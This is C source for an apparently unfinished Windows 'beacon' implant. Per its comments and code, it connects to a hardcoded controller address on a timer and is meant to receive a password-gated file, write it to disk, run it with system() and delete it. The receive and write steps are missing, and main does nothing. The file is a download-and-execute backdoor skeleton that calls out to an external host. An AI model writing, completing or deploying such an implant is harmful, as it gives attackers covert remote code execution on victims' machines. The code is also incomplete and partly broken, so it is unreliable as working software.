#include <stdio.h>
#include <winsock2.h>
#include <stdint.h>
#include <windows.h>

// server attempts to connect to client on regular basis until client opens port
// 1: client -> server :: password
// 2: client -> server :: filesize in bytes
// 3: client -> server :: file
// 4: server writes file to disk
// 5: server executes disk

#pragma comment(lib, "ws2_32.lib") //Winsock library

// WINDOWS GCC Complie
// gcc winbeacon.c -o prog.exe -lws2_32

// MINGW COMPILE
// x86_64-w64-mingw32-gcc winbeacon.c -o prog.exe -lws2_32

#define EXECUTABLE_NAME "foo.exe"
#define PASSWORD "password"
#define DESTINATION_IP "192.168.1.30"
#define DESTINATION_PORT 8080
#define NUM_SECONDS_BETWEEN_CALLBACKS 60


DWORD WINAPI ThreadFuncRunExe(void* data) {
	system(EXECUTABLE_NAME);
	DeleteFile(EXECUTABLE_NAME);
	return 0;
}

DWORD WINAPI ThreadFunc(void* data) {
	FILE *fp;
	int status;
	char path[PATH_MAX];
	size_t PASSWORD_LEN = strlen(PASSWORD);
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
	char *message, server_reply[PASSWORD_LEN + 1];
	if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
	{
		printf("Failed. Error code : %d", WSAGetLastError());
		return 1;
	}
	printf("Initialized.\n");
	
	if(( s = socket(AF_INET, SOCK_STREAM, 0 )) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
	}
	
	printf("Socket created.\n");

	server.sin_addr.s_addr = inet_addr(DESTINATION_IP);
	server.sin_family = AF_INET;
	server.sin_port = htons( DESTINATION_PORT );
	
	
	// Connect to remote server
	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		puts("connect error");
		goto close_socket;
		//return 1;
	}

	puts("connected");

	// Send Some Data
	message = "GET / HTTP/1.1\r\n\r\n";
	if( send(s, message, strlen(message), 0) < 0)
	{
		puts("Send failed");
		goto close_socket;
		//return 1;
	}

	puts("Data send\n");

	close_socket:
	if(closesocket(s) == SOCKET_ERROR) {
		puts("close socket failed");
	}
	return 0;
}

int main(int argc, char *argv[])
{
return 0;
}

